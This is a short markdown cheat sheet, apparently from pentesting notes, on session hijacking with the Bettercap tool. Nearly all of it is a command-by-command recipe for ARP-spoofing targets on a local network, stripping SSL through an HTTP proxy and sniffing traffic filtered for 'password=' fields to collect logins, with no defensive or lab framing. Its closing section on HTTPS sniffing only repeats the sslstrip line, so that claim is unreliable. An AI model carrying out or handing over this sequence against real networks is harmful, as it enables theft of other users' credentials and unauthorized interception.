## Session hijacking cheat sheet


### Bettercap

#### Using Bettercap to collects all http logins used by routers, servers, and websites that do not have SSL enabled

```sh
bettercap -iface eth0
```
-iface: Specifies the interface to bind to.


```sh
net.probe on
```
This module will send different types of probe packets to each IP in the current subnet for the net.recon module to detect them.


```sh
net.recon on
```
The net.recon module displays the detected active IP addresses in the network. In real-time, this module will start sniffing network packets.


```sh
set http.proxy.sslstrip true
```
This module enables SSL stripping.


```sh
set arp.spoof.internal true
```
This module spoofs the local connections among computers of the internal network.


```sh
set arp.spoof.targets [Target IP]
```
This module spoofs the IP address of the target host.


```sh
http.proxy on
```
This module initiates http proxy.


```sh
arp.spoof on
```
This module initiates arp spoofing.


```sh
net.sniff on
```
This module is responsible for performing sniffing on the network.


```sh
set net.sniff.regexp '.*password=.+'
```
This module will only consider the packets sent with a payload matching the given regular expression (in this case, ‘.*password=.+’).


#### Using Bettercap to sniff network traffic from https-based websites


```sh
set http.proxy.sslstrip true
```


## License

© 2021 [javierizquierdovera.com](https://javierizquierdovera.com)

Licensed under the [Apache License, Version 2.0](https://www.apache.org/licenses/LICENSE-2.0) ([`LICENSE-APACHE`](LICENSE-APACHE)) or the [MIT license](https://opensource.org/licenses/MIT) ([`LICENSE-MIT`](LICENSE-MIT)), at your option.

`SPDX-License-Identifier: (Apache-2.0 OR MIT)`